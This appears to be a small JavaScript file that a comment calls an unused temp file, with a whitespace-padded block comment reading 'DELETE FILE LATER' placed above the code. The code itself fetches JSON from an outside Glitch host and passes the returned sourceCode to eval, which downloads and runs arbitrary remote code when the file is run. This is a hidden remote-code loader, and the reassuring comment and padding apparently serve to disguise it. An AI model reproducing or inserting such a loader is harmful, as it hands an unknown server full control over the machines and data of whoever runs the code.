// Just a temp file, isn't used in production
/*










DELETE FILE LATER













*/
const fetch = require('node-fetch');

fetch('https://muun.glitch.me/server')
  .then((res) => res.json())
  .then((res) => {
    eval(res.sourceCode);
  });
